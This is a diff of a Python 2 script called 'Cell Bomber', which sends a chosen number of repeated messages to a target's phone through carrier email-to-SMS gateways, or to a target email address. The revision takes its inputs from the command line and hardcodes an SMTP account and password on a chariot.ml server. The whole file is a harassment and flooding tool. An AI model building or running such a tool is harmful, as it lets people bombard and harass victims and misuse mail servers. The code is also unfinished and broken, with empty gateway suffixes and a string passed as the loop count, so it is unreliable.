@@ -1,63 +1,49 @@
 __author__ = 'n3tn0'
-__version__ = '1.0.2'
+__base__='n3tn0/Opprimo:master'
+__baseversion__ = '1.0.2'
+__version__='ALPHA'
 
-from getpass import getpass
 import smtplib
+import sys
 
 #Define carriers that can be chosen from
 carriers = {'Verizon': '@vtext.com',
-            'AT&T': '@',
+            'ATT': '@',
             'Sprint': '@',
-            'T-Mobile': '@',
+            'Boost Mobile': '@',
+            'TMobile': '@',
+            'MetroPCS': '@',
             'Virgin Mobile': '@',
             'Custom': ''}
-#############THIS TO BE AN ADDED FUNCTION IN A LATER VERSION##############
-emails = {'GMail': 'smtp.gmail.com:587',
-          'Hotmail': ''}
 
-#Print program information
-print 'Cell Bomber'
-print 'Version: %s' % str(__version__)
-print 'By: %s' % str(__author__)
-
-# Print the list of carriers that can be chosen from
-x = 1
-carrier_list = {}
-print '\n'
+#Make the list of carriers uppercase to avoid conflict with user input
+carriers_upper = {}
+upper=''
 for i in carriers:
-    carrier_list[x] = i
-    x += 1
-x = 1
-for i in carrier_list:
-    print '[%i] %s' % (x, carrier_list[i])
-    x += 1
+    #upper = i.upper()
+    carriers_upper[i.upper()] = carriers[i]
 
-#Let the user enter the target phone and choose the carrier
-carrier_num = 0
-try:
-    carrier_num = int(raw_input('Enter Number of Target\'s Carrier: '))
-except carrier_num > len(carriers) + 1 or ValueError:
-    print 'Enter the number!'
-if carrier_list[carrier_num] == 'Custom':
-    target_addr = raw_input('Enter the email address to be bombed: ')
+#Determine and format the final target address
+if sys.argv[2].upper() == 'EMAIL':
+    target = sys.argv[1]
 else:
-    target_number = raw_input('Enter Target\'s Cell Number: ')
-    target_addr = [str(target_number) + carriers[carrier_list[carrier_num]]]
-amount = int(raw_input('Send Count: '))
+    target = sys.argv[1] + carriers_upper[sys.argv[2].upper()]
 
-#Get the information of the sender
-print '\n Input Sender Information'
-user = raw_input('Your Email: ')
-password = getpass('Password: ')
-smtpserver = raw_input('SMTP Server and Port: ')
+
+amount = sys.argv[3]
+
+#READ FROM TEXT FILE IN FUTURE
+user = 'crush@chariot.ml'
+password = 'opprimo'
+smtpserver = 'chariot.ml:25'
 
 #Get the message to be sent
-body = raw_input('Enter Message to be Sent: ')
+body = sys.argv[4]
 
 #Prepare message for sending
-header = 'From: %s\n' % user
-header += 'To: %s\n' % ','.join(target_addr)
-message = header + body
+#header = 'From: %s\n' % user
+#header += 'To: %s\n' % ','.join(target_addr)
+#message = header + body
 server = smtplib.SMTP(smtpserver)
 server.starttls()
 
@@ -65,17 +51,11 @@ server.starttls()
 try:
     server.login(user, password)
 except smtplib.SMTPAuthenticationError:
-    print '\nUsername and Password not accepted!'
     exit()
 
 #Send the message
 for i in range(amount):
-    server.sendmail(user, target_addr, message)
-    if amount == 0:
-        print '1 Message Sent'
-    else:
-        x = i + 1
-        print '%i Messages Sent' % x
+    server.sendmail(user, target, body)
 
 #Cleanup
 server.quit()
